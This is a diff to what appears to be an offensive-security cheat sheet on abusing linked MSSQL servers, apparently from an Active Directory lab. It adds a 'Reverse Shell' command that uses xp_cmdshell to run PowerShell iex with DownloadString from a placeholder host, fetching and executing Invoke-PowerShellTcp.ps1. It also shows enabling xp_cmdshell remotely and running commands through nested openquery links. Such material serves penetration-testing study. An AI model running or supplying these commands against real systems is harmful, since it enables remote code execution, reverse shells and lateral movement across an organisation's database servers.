@@ -673,12 +673,12 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 ```powershell
 # Command: whoami
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
-# Enumerating Database Links
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+# Reverse Shell
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.corp.corporate.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<address>/Invoke-PowerShellTcp.ps1'')"'
 ```
 ```mysql
 # Enable xp_cmdshell
 EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"
 # Command: whoami
-select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.eurocorp.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.corporate.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
 ```
